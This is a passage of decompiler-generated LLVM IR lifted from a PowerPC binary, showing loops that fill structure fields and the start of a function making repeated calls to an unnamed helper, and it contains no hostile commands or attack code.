  store i1 %v3_10003494, i1* %cr7_eq.global-to-local, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000349c = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_1000349c, i32* %r9.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_100034a4 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v0_100034a8 = load i32, i32* %r19.global-to-local, align 4
  %v1_100034a8 = trunc i32 %v0_100034a8 to i16
  %v2_100034a8 = load i32, i32* @r31, align 4
  %v3_100034a8 = add i32 %v2_100034a8, 4
  %v4_100034a8 = inttoptr i32 %v3_100034a8 to i16*
  store i16 %v1_100034a8, i16* %v4_100034a8, align 2
  %v1_100034ac = load i32, i32* @r31, align 4
  %v2_100034ac = inttoptr i32 %v1_100034ac to i32*
  store i32 %v1_100034a4, i32* %v2_100034ac, align 4
  %v0_100034b0 = load i32, i32* %r26.global-to-local, align 4
  %v1_100034b0 = trunc i32 %v0_100034b0 to i16
  %v2_100034b0 = load i32, i32* @r31, align 4
  %v3_100034b0 = add i32 %v2_100034b0, 2
  %v4_100034b0 = inttoptr i32 %v3_100034b0 to i16*
  store i16 %v1_100034b0, i16* %v4_100034b0, align 2
  store i32 %v4_100034b4, i32* %r9.global-to-local, align 4
  %v2_100034b8 = load i32, i32* @r31, align 4
  %v3_100034b8 = add i32 %v2_100034b8, 1
  %v4_100034b8 = inttoptr i32 %v3_100034b8 to i8*
  store i8 %v5_100030dc, i8* %v4_100034b8, align 1
  store i32 %v4_100034bc, i32* %r0.global-to-local, align 4
  %v2_100034c0 = load i32, i32* @r31, align 4
  %v3_100034c0 = add i32 %v2_100034c0, 8
  %v4_100034c0 = inttoptr i32 %v3_100034c0 to i8*
  store i8 %v5_10003114, i8* %v4_100034c0, align 1
  %v0_100034c4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100034c4, label %dec_label_pc_100034d0, label %dec_label_pc_100034c8

dec_label_pc_100034c8:                            ; preds = %dec_label_pc_10003440
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_100034cc = load i32, i32* @r31, align 4
  %v3_100034cc = add i32 %v2_100034cc, 6
  %v4_100034cc = inttoptr i32 %v3_100034cc to i16*
  store i16 16384, i16* %v4_100034cc, align 2
  br label %dec_label_pc_100034d0

dec_label_pc_100034d0:                            ; preds = %dec_label_pc_10003440, %dec_label_pc_100034c8
  %v2_100034d8 = load i32, i32* @r31, align 4
  %v3_100034d8 = add i32 %v2_100034d8, 9
  %v4_100034d8 = inttoptr i32 %v3_100034d8 to i8*
  store i8 6, i8* %v4_100034d8, align 1
  %v3_100034dc = load i32, i32* @global_var_1001b288.63, align 4
  store i32 %v3_100034dc, i32* %r0.global-to-local, align 4
  %v1_100034e0 = load i32, i32* @r31, align 4
  %v2_100034e0 = add i32 %v1_100034e0, 12
  %v3_100034e0 = inttoptr i32 %v2_100034e0 to i32*
  store i32 %v3_100034dc, i32* %v3_100034e0, align 4
  %v3_100034e4 = load i32, i32* %stack_var_-408, align 4
  %v1_100034e8 = mul i32 %v3_100034e4, 16
  store i32 %v1_100034e8, i32* %r9.global-to-local, align 4
  %v1_100034ec = load i32, i32* %r22.global-to-local, align 4
  %v2_100034ec = add i32 %v1_100034ec, %v1_100034e8
  %v3_100034ec = inttoptr i32 %v2_100034ec to i32*
  %v4_100034ec = load i32, i32* %v3_100034ec, align 4
  store i32 %v4_100034ec, i32* %r0.global-to-local, align 4
  store i32 %v2_100034ec, i32* %r9.global-to-local, align 4
  %v1_100034f4 = add i32 %v2_100034ec, 12
  %v2_100034f4 = inttoptr i32 %v1_100034f4 to i16*
  %v3_100034f4 = load i16, i16* %v2_100034f4, align 2
  %v4_100034f4 = zext i16 %v3_100034f4 to i32
  store i32 %v4_100034f4, i32* %r11.global-to-local, align 4
  %v1_100034f8 = load i32, i32* @r31, align 4
  %v2_100034f8 = add i32 %v1_100034f8, 16
  %v3_100034f8 = inttoptr i32 %v2_100034f8 to i32*
  store i32 %v4_100034ec, i32* %v3_100034f8, align 4
  %v0_100034fc = load i32, i32* %r11.global-to-local, align 4
  %v1_100034fc = trunc i32 %v0_100034fc to i16
  %v2_100034fc = load i32, i32* @r31, align 4
  %v3_100034fc = add i32 %v2_100034fc, 20
  %v4_100034fc = inttoptr i32 %v3_100034fc to i16*
  store i16 %v1_100034fc, i16* %v4_100034fc, align 2
  %v0_10003500 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003500 = add i32 %v0_10003500, 8
  %v2_10003500 = inttoptr i32 %v1_10003500 to i32*
  %v3_10003500 = load i32, i32* %v2_10003500, align 4
  store i32 %v3_10003500, i32* %r0.global-to-local, align 4
  %v0_10003504 = load i32, i32* @r30, align 4
  %v1_10003504 = add i32 %v0_10003504, 12
  %v2_10003504 = inttoptr i32 %v1_10003504 to i32*
  %v3_10003504 = load i32, i32* %v2_10003504, align 4
  store i32 %v3_10003504, i32* %r11.global-to-local, align 4
  %v2_10003508 = add i32 %v0_10003504, 4
  %v3_10003508 = inttoptr i32 %v2_10003508 to i32*
  store i32 %v3_10003500, i32* %v3_10003508, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10003510 = call i32 @__asm_rlwimi(i32 8, i32 28, i32 0, i32 3)
  store i32 %v1_10003510, i32* %r11.global-to-local, align 4
  %v0_10003514 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003514 = add i32 %v0_10003514, 14
  %v2_10003514 = inttoptr i32 %v1_10003514 to i16*
  %v3_10003514 = load i16, i16* %v2_10003514, align 2
  %v4_10003514 = zext i16 %v3_10003514 to i32
  store i32 %v4_10003514, i32* %r0.global-to-local, align 4
  %v1_10003518 = add i32 %v0_10003514, 4
  %v2_10003518 = inttoptr i32 %v1_10003518 to i32*
  %v3_10003518 = load i32, i32* %v2_10003518, align 4
  store i32 %v3_10003518, i32* %r10.global-to-local, align 4
  %v1_1000351c = or i32 %v1_10003510, 1114112
  store i32 %v1_1000351c, i32* %r11.global-to-local, align 4
  %v2_10003520 = load i32, i32* @r30, align 4
  %v3_10003520 = add i32 %v2_10003520, 2
  %v4_10003520 = inttoptr i32 %v3_10003520 to i16*
  store i16 %v3_10003514, i16* %v4_10003520, align 2
  %v0_10003524 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003524 = load i32, i32* @r30, align 4
  %v2_10003524 = add i32 %v1_10003524, 8
  %v3_10003524 = inttoptr i32 %v2_10003524 to i32*
  store i32 %v0_10003524, i32* %v3_10003524, align 4
  %v0_10003528 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003528 = load i32, i32* @r30, align 4
  %v2_10003528 = add i32 %v1_10003528, 12
  %v3_10003528 = inttoptr i32 %v2_10003528 to i32*
  store i32 %v0_10003528, i32* %v3_10003528, align 4
  %v0_1000352c = call i32 @function_10006318()
  %v1_1000352c = trunc i32 %v0_1000352c to i16
  store i32 %v1_10003164, i32* %r9.global-to-local, align 4
  %v3_10003534 = load i32, i32* @r30, align 4
  %v4_10003534 = add i32 %v3_10003534, 14
  %v5_10003534 = inttoptr i32 %v4_10003534 to i16*
  store i16 %v1_1000352c, i16* %v5_10003534, align 2
  %v0_10003538 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10003538, i32* @r4, align 4
  %v0_1000353c = load i32, i32* @r31, align 4
  %v1_1000353c = add i32 %v0_1000353c, 40
  store i32 %v1_1000353c, i32* @r3, align 4
  %v0_10003540 = load i32, i32* @r30, align 4
  %v1_10003540 = add i32 %v0_10003540, 12
  %v2_10003540 = inttoptr i32 %v1_10003540 to i32*
  %v3_10003540 = load i32, i32* %v2_10003540, align 4
  store i32 %v3_10003540, i32* %r0.global-to-local, align 4
  %v1_10003544 = call i32 @__asm_rlwimi(i32 %v1_10003164, i32 21, i32 10, i32 10)
  store i32 %v1_10003544, i32* %r0.global-to-local, align 4
  %v1_10003548 = call i32 @__asm_rlwimi(i32 %v1_10003188, i32 20, i32 11, i32 11)
  store i32 %v1_10003548, i32* %r0.global-to-local, align 4
  %v1_1000354c = call i32 @__asm_rlwimi(i32 %v1_100031a0, i32 19, i32 12, i32 12)
  store i32 %v1_1000354c, i32* %r0.global-to-local, align 4
  %v1_10003550 = call i32 @__asm_rlwimi(i32 %v1_100031b8, i32 18, i32 13, i32 13)
  store i32 %v1_10003550, i32* %r0.global-to-local, align 4
  %v1_10003554 = call i32 @__asm_rlwimi(i32 %v1_100031d0, i32 17, i32 14, i32 14)
  store i32 %v1_10003554, i32* %r0.global-to-local, align 4
  %v1_10003558 = call i32 @__asm_rlwimi(i32 %v1_100031e8, i32 16, i32 15, i32 15)
  store i32 %v1_10003558, i32* %r0.global-to-local, align 4
  %v1_1000355c = load i32, i32* @r30, align 4
  %v2_1000355c = add i32 %v1_1000355c, 12
  %v3_1000355c = inttoptr i32 %v2_1000355c to i32*
  store i32 %v1_10003558, i32* %v3_1000355c, align 4
  %v0_10003560 = call i32 @function_10006544()
  store i32 %v0_10003560, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003564

dec_label_pc_10003564:                            ; preds = %dec_label_pc_10003274, %dec_label_pc_100034d0
  %v3_10003564 = load i32, i32* %stack_var_-408, align 4
  %v1_10003568 = add i32 %v3_10003564, 1
  store i32 %v1_10003568, i32* %r9.global-to-local, align 4
  %v1_1000356c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000356c = icmp slt i32 %v1_10003568, %v1_1000356c
  %v4_1000356c = icmp eq i32 %v1_10003568, %v1_1000356c
  store i1 %v4_1000356c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003568, i32* %stack_var_-408, align 4
  br i1 %v2_1000356c, label %dec_label_pc_10003270, label %dec_label_pc_10003578.loopexit

dec_label_pc_10003578.loopexit:                   ; preds = %dec_label_pc_10003564
  %v0_10003584.pre.pre = load i1, i1* %cr3_eq.global-to-local, align 1
  %v1_10003584.pre.pre = load i1, i1* %cr3_lt.global-to-local, align 1
  br label %dec_label_pc_10003578

dec_label_pc_10003578:                            ; preds = %dec_label_pc_10003578.loopexit, %dec_label_pc_10003250
  %v1_10003584.pre = phi i1 [ %v1_10003584.pre.pre, %dec_label_pc_10003578.loopexit ], [ %v1_10003250, %dec_label_pc_10003250 ]
  %v0_10003584.pre = phi i1 [ %v0_10003584.pre.pre, %dec_label_pc_10003578.loopexit ], [ %v3_10003250, %dec_label_pc_10003250 ]
  %v0_10003578 = load i32, i32* %r27.global-to-local, align 4
  %v3_10003578 = icmp eq i32 %v0_10003578, 0
  store i1 %v3_10003578, i1* %cr2_eq.global-to-local, align 1
  %v0_1000357c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000357c = add i32 %v0_1000357c, 40
  store i32 %v1_1000357c, i32* %r26.global-to-local, align 4
  %v1_10003580 = add i32 %v0_1000357c, 20
  store i32 %v1_10003580, i32* @r31, align 4
  br label %dec_label_pc_10003584.outer

dec_label_pc_10003584.outer:                      ; preds = %dec_label_pc_10003658, %dec_label_pc_10003578
  %v1_10003584.ph = phi i1 [ %v1_10003584.pre, %dec_label_pc_10003578 ], [ %v1_10003658, %dec_label_pc_10003658 ]
  %v0_10003584.ph = phi i1 [ %v0_10003584.pre, %dec_label_pc_10003578 ], [ %v0_10003658, %dec_label_pc_10003658 ]
  %v2_10003584 = or i1 %v1_10003584.ph, %v0_10003584.ph
  br label %dec_label_pc_10003584

dec_label_pc_10003584:                            ; preds = %dec_label_pc_10003584.outer, %dec_label_pc_10003584
  br i1 %v2_10003584, label %dec_label_pc_10003584, label %dec_label_pc_10003588

dec_label_pc_10003588:                            ; preds = %dec_label_pc_10003584, %dec_label_pc_10003658
  store i32 0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %stack_var_-408, align 4
  %v0_10003598 = load i32, i32* %r19.global-to-local, align 4
  %v4_10003598 = icmp eq i32 %v0_10003598, 65535
  store i1 %v4_10003598, i1* %cr4_eq.global-to-local, align 1
  %v0_1000359c = load i32, i32* @r31, align 4
  %v1_1000359c = urem i32 %v0_1000359c, 65536
  store i32 %v1_1000359c, i32* @r30, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100035a8

dec_label_pc_100035a8:                            ; preds = %dec_label_pc_100035c4.dec_label_pc_100035a8_crit_edge, %dec_label_pc_10003588
  %v0_100035b4 = phi i1 [ %v0_100035b4.pre, %dec_label_pc_100035c4.dec_label_pc_100035a8_crit_edge ], [ %v4_10003598, %dec_label_pc_10003588 ]
  %v0_100035a8 = phi i32 [ %v1_10003648, %dec_label_pc_100035c4.dec_label_pc_100035a8_crit_edge ], [ 0, %dec_label_pc_10003588 ]
  %v1_100035a8 = mul i32 %v0_100035a8, 4
  store i32 %v1_100035a8, i32* %r0.global-to-local, align 4
  %v0_100035ac = load i32, i32* %r23.global-to-local, align 4
  %v2_100035ac = add i32 %v0_100035ac, %v1_100035a8
  %v3_100035ac = inttoptr i32 %v2_100035ac to i32*
  %v4_100035ac = load i32, i32* %v3_100035ac, align 4
  store i32 %v4_100035ac, i32* @r29, align 4
  %v1_100035b0 = add i32 %v4_100035ac, 20
  store i32 %v1_100035b0, i32* %r28.global-to-local, align 4
  br i1 %v0_100035b4, label %dec_label_pc_10003660, label %dec_label_pc_100035b8

dec_label_pc_100035b8:                            ; preds = %dec_label_pc_100035a8
  %v1_100035b8 = add i32 %v4_100035ac, 40
  store i32 %v1_100035b8, i32* @r3, align 4
  %v0_100035bc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_100035bc, i32* @r4, align 4
  %v0_100035c0 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_100035c0, label %dec_label_pc_100035c4, label %dec_label_pc_10003674

dec_label_pc_100035c4:                            ; preds = %dec_label_pc_100035b8, %dec_label_pc_10003660, %dec_label_pc_10003674
  %v2_100035c4 = phi i32 [ %v4_100035ac, %dec_label_pc_100035b8 ], [ %v0_1000366c, %dec_label_pc_10003660 ], [ %v2_100035c4.pre, %dec_label_pc_10003674 ]
  %v0_100035c4 = load i32, i32* %r27.global-to-local, align 4
  %v1_100035c4 = trunc i32 %v0_100035c4 to i16
  %v3_100035c4 = add i32 %v2_100035c4, 10
  %v4_100035c4 = inttoptr i32 %v3_100035c4 to i16*
  store i16 %v1_100035c4, i16* %v4_100035c4, align 2
  %v0_100035cc = load i32, i32* @r29, align 4
  store i32 %v0_100035cc, i32* @r3, align 4
  %v2_100035d0 = call i32 @function_1000491c(i32 %v0_100035cc, i32 20)
  %v3_100035d0 = trunc i32 %v2_100035d0 to i16
  store i32 %v2_100035d0, i32* %r3.global-to-local, align 4
  %v3_100035d4 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_100035d4, i32* %r9.global-to-local, align 4
  %v3_100035d8 = load i32, i32* @r29, align 4
  %v4_100035d8 = add i32 %v3_100035d8, 10
  %v5_100035d8 = inttoptr i32 %v4_100035d8 to i16*
  store i16 %v3_100035d0, i16* %v5_100035d8, align 2
  %v0_100035dc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_100035dc, i32* @r4, align 4
  %v0_100035e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100035e0 = mul i32 %v0_100035e0, 16
  store i32 %v1_100035e0, i32* %r9.global-to-local, align 4
  %v0_100035e4 = load i32, i32* %r27.global-to-local, align 4
  %v1_100035e4 = trunc i32 %v0_100035e4 to i16
  %v3_100035e4 = add i32 %v0_100035dc, 16
  %v4_100035e4 = inttoptr i32 %v3_100035e4 to i16*
  store i16 %v1_100035e4, i16* %v4_100035e4, align 2
  %v0_100035e8 = load i32, i32* %r22.global-to-local, align 4
  %v1_100035e8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100035e8 = add i32 %v1_100035e8, %v0_100035e8
  store i32 %v2_100035e8, i32* %r9.global-to-local, align 4
  %v0_100035ec = load i32, i32* @r30, align 4
  %v1_100035f0 = add i32 %v2_100035e8, 4
  %v2_100035f0 = inttoptr i32 %v1_100035f0 to i32*
  %v3_100035f0 = load i32, i32* %v2_100035f0, align 4
  store i32 %v3_100035f0, i32* %r11.global-to-local, align 4
  %v0_100035f4 = load i32, i32* @r31, align 4
  %v0_100035f8 = load i32, i32* @r29, align 4
  store i32 %v0_100035f8, i32* %r3.global-to-local, align 4
  %v1_100035fc = load i32, i32* %r28.global-to-local, align 4
  %v2_100035fc = add i32 %v1_100035fc, 4
  %v3_100035fc = inttoptr i32 %v2_100035fc to i32*
  store i32 %v3_100035f0, i32* %v3_100035fc, align 4
  %v0_10003600 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003600 = add i32 %v0_10003600, 1
  store i32 %v1_10003600, i32* %r11.global-to-local, align 4
  %v1_10003604 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003604 = add i32 %v1_10003604, 4
  %v3_10003604 = inttoptr i32 %v2_10003604 to i32*
  store i32 %v1_10003600, i32* %v3_10003604, align 4
  %v0_10003608 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003608 = add i32 %v0_10003608, 8
  %v2_10003608 = inttoptr i32 %v1_10003608 to i32*
  %v3_10003608 = load i32, i32* %v2_10003608, align 4
  store i32 %v3_10003608, i32* %r0.global-to-local, align 4
  %v1_1000360c = load i32, i32* %r28.global-to-local, align 4
  %v2_1000360c = add i32 %v1_1000360c, 8
  %v3_1000360c = inttoptr i32 %v2_1000360c to i32*
  store i32 %v3_10003608, i32* %v3_1000360c, align 4
  %v4_10003610 = call i32 @function_10004980(i32 %v0_100035f8, i32 %v0_100035dc, i32 %v0_100035ec, i32 %v0_100035f4)
  %v5_10003610 = trunc i32 %v4_10003610 to i16
  store i32 %v4_10003610, i32* %r3.global-to-local, align 4
  %v3_10003614 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003614, i32* %r7.global-to-local, align 4
  %v0_10003618 = load i32, i32* %r28.global-to-local, align 4
  %v1_10003618 = add i32 %v0_10003618, 2
  %v2_10003618 = inttoptr i32 %v1_10003618 to i16*
  %v3_10003618 = load i16, i16* %v2_10003618, align 2
  %v4_10003618 = zext i16 %v3_10003618 to i32
  store i32 %v4_10003618, i32* %r0.global-to-local, align 4
  %v0_1000361c = load i32, i32* @r29, align 4
  %v1_10003620 = mul i32 %v3_10003614, 24
  store i32 %v1_10003620, i32* %r7.global-to-local, align 4
  %v4_10003624 = add i32 %v0_10003618, 16
  %v5_10003624 = inttoptr i32 %v4_10003624 to i16*
  store i16 %v5_10003610, i16* %v5_10003624, align 2
  %v0_10003628 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000362c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_1000362c, i32* %r3.global-to-local, align 4
  %v0_10003630 = load i32, i32* %r7.global-to-local, align 4
  %v1_10003630 = load i32, i32* %r20.global-to-local, align 4
  %v2_10003630 = add i32 %v1_10003630, %v0_10003630
  store i32 %v2_10003630, i32* %r7.global-to-local, align 4
  %v0_10003638 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003638 = trunc i32 %v0_10003638 to i16
  %v3_10003638 = add i32 %v2_10003630, 2
  %v4_10003638 = inttoptr i32 %v3_10003638 to i16*
  store i16 %v1_10003638, i16* %v4_10003638, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268449348, i32* @lr, align 4
  %v6_10003640 = call i32 @function_10008ab8(i32 %v0_1000362c, i32 %v0_1000361c, i32 %v0_10003628, i32 16384, i32 %v2_10003630, i32 16)
  store i32 %v6_10003640, i32* %r3.global-to-local, align 4
  %v3_10003644 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003644, i32* %r9.global-to-local, align 4
  %v1_10003648 = add i32 %v3_10003644, 1
  store i32 %v1_10003648, i32* %r0.global-to-local, align 4
  %v1_1000364c = load i32, i32* %r21.global-to-local, align 4
  %v2_1000364c = icmp slt i32 %v1_10003648, %v1_1000364c
  %v4_1000364c = icmp eq i32 %v1_10003648, %v1_1000364c
  store i1 %v4_1000364c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10003648, i32* %stack_var_-408, align 4
  br i1 %v2_1000364c, label %dec_label_pc_100035c4.dec_label_pc_100035a8_crit_edge, label %dec_label_pc_10003658

dec_label_pc_100035c4.dec_label_pc_100035a8_crit_edge: ; preds = %dec_label_pc_100035c4
  %v0_100035b4.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  br label %dec_label_pc_100035a8

dec_label_pc_10003658:                            ; preds = %dec_label_pc_100035c4
  %v0_10003658 = load i1, i1* %cr3_eq.global-to-local, align 1
  %v1_10003658 = load i1, i1* %cr3_lt.global-to-local, align 1
  %v2_10003658 = or i1 %v0_10003658, %v1_10003658
  br i1 %v2_10003658, label %dec_label_pc_10003584.outer, label %dec_label_pc_10003588

dec_label_pc_10003660:                            ; preds = %dec_label_pc_100035a8
  %v0_10003660 = call i32 @function_10006318()
  %v1_10003660 = trunc i32 %v0_10003660 to i16
  %v0_10003664 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10003664, i32* @r4, align 4
  %v3_10003668 = load i32, i32* @r29, align 4
  %v4_10003668 = add i32 %v3_10003668, 4
  %v5_10003668 = inttoptr i32 %v4_10003668 to i16*
  store i16 %v1_10003660, i16* %v5_10003668, align 2
  %v0_1000366c = load i32, i32* @r29, align 4
  %v1_1000366c = add i32 %v0_1000366c, 40
  store i32 %v1_1000366c, i32* @r3, align 4
  %v0_10003670 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10003670, label %dec_label_pc_100035c4, label %dec_label_pc_10003674

dec_label_pc_10003674:                            ; preds = %dec_label_pc_100035b8, %dec_label_pc_10003660
  %v0_10003674 = call i32 @function_10006544()
  store i32 %v0_10003674, i32* %r3.global-to-local, align 4
  %v2_100035c4.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100035c4

; uselistorder directives
  uselistorder i32 %v0_1000366c, { 1, 0 }
  uselistorder i1 %v1_10003658, { 1, 0 }
  uselistorder i1 %v0_10003658, { 1, 0 }
  uselistorder i32 %v1_10003648, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v4_10003610, { 1, 0 }
  uselistorder i32 %v0_100035dc, { 1, 0, 2 }
  uselistorder i32 %v2_100035d0, { 1, 0 }
  uselistorder i32 %v1_100035a8, { 1, 0 }
  uselistorder i32 %v1_10003568, { 0, 2, 1, 3 }
  uselistorder i32 %v2_100034ec, { 1, 0, 2 }
  uselistorder i32 %v1_100034e8, { 1, 0 }
  uselistorder i32 %v1_10003480, { 1, 0 }
  uselistorder i32 %v1_1000344c, { 1, 0 }
  uselistorder i32 %v0_100033cc, { 1, 0 }
  uselistorder i32 %v2_100033c0, { 1, 2, 0 }
  uselistorder i1 %v4_10003344, { 1, 0 }
  uselistorder i16 %storemerge, { 1, 0 }
  uselistorder i32 %v3_100033a4, { 1, 3, 0, 2 }
  uselistorder i32 %v1_10003380, { 1, 0 }
  uselistorder i32 %v1_10003128, { 1, 0 }
  uselistorder i8 %v5_10003114, { 1, 0 }
  uselistorder i8 %v5_100030dc, { 1, 0 }
  uselistorder i16 %tmp13, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 29, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0, 1 }
  uselistorder i32* %r25.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r24.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43 }
  uselistorder i1* %cr3_lt.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr3_eq.global-to-local, { 1, 0, 2 }
  uselistorder i8 6, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32 1179648, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003674, { 1, 0 }
  uselistorder label %dec_label_pc_100035c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003588, { 1, 0 }
  uselistorder label %dec_label_pc_10003584, { 1, 0 }
  uselistorder label %dec_label_pc_10003564, { 1, 0 }
  uselistorder label %dec_label_pc_100034d0, { 1, 0 }
  uselistorder label %dec_label_pc_100033e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10003360, { 1, 2, 0 }
}

define i32 @function_1000367c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000367c:
  %cr2_eq.global-to-local = alloca i1, align 1
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_10003680 = load i32, i32* @lr, align 4
  store i32 %v0_10003680, i32* %r0.global-to-local, align 4
  %v0_10003684 = call i32 @__asm_mfcr()
  store i32 %v0_10003684, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r25.global-to-local, align 4
  %v0_10003694 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10003684, i32* %r21.global-to-local, align 4
  %v0_100036d4 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_100036dc = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_100036e4 = load i32, i32* @r30, align 4
  store i32 268449520, i32* @lr, align 4
  %v2_100036ec = call i32 @function_10008ec0(i32 4, i32 4)
  store i32 %v2_100036ec, i32* %r22.global-to-local, align 4
  %v0_100036f4 = load i32, i32* @r28, align 4
  %v0_10003700 = load i32, i32* @r29, align 4
  store i32 %v0_10003700, i32* %r3.global-to-local, align 4
  store i32 268449544, i32* @lr, align 4
  %v4_10003704 = inttoptr i32 %v0_100036f4 to i32*
  %v5_10003704 = call i32 @function_100021c0(i32 %v0_10003700, i32* %v4_10003704, i32 2, i32 0)
  %v5_10003714 = trunc i32 %v5_10003704 to i8
  %v0_1000371c = load i32, i32* @r28, align 4
  %v0_10003720 = load i32, i32* @r29, align 4
  store i32 %v0_10003720, i32* %r3.global-to-local, align 4
  store i32 268449576, i32* @lr, align 4
  %v4_10003724 = inttoptr i32 %v0_1000371c to i32*
  %v5_10003724 = call i32 @function_100021c0(i32 %v0_10003720, i32* %v4_10003724, i32 3, i32 65535)
  %v0_10003728 = load i32, i32* @r28, align 4
  store i32 %v5_10003724, i32* %r18.global-to-local, align 4
  %v0_10003738 = load i32, i32* @r29, align 4
  store i32 %v0_10003738, i32* %r3.global-to-local, align 4
  store i32 268449600, i32* @lr, align 4
  %v4_1000373c = inttoptr i32 %v0_10003728 to i32*
  %v5_1000373c = call i32 @function_100021c0(i32 %v0_10003738, i32* %v4_1000373c, i32 4, i32 64)
  %v0_10003740 = load i32, i32* @r28, align 4
  %v5_1000374c = trunc i32 %v5_1000373c to i8
  %v0_10003754 = load i32, i32* @r29, align 4
  store i32 %v0_10003754, i32* %r3.global-to-local, align 4
  store i32 268449628, i32* @lr, align 4
  %v4_10003758 = inttoptr i32 %v0_10003740 to i32*
  %v5_10003758 = call i32 @function_100021c0(i32 %v0_10003754, i32* %v4_10003758, i32 5, i32 0)
  %v0_10003768 = load i32, i32* @r28, align 4
  %v1_1000376c = urem i32 %v5_10003758, 256
  store i32 %v1_1000376c, i32* @r31, align 4
  %v0_10003770 = load i32, i32* @r29, align 4
  store i32 %v0_10003770, i32* %r3.global-to-local, align 4
  store i32 268449656, i32* @lr, align 4
  %v4_10003774 = inttoptr i32 %v0_10003768 to i32*
  %v5_10003774 = call i32 @function_100021c0(i32 %v0_10003770, i32* %v4_10003774, i32 6, i32 65535)
  %v0_1000377c = load i32, i32* @r28, align 4
  store i32 %v5_10003774, i32* %r19.global-to-local, align 4
  %v0_1000378c = load i32, i32* @r29, align 4
  store i32 %v0_1000378c, i32* %r3.global-to-local, align 4
  store i32 268449684, i32* @lr, align 4
  %v4_10003790 = inttoptr i32 %v0_1000377c to i32*
  %v5_10003790 = call i32 @function_100021c0(i32 %v0_1000378c, i32* %v4_10003790, i32 7, i32 65535)
  %v0_10003798 = load i32, i32* @r28, align 4
  store i32 %v5_10003790, i32* %r20.global-to-local, align 4
  %v0_100037a8 = load i32, i32* @r29, align 4
  store i32 %v0_100037a8, i32* %r3.global-to-local, align 4
  store i32 268449712, i32* @lr, align 4
  %v4_100037ac = inttoptr i32 %v0_10003798 to i32*
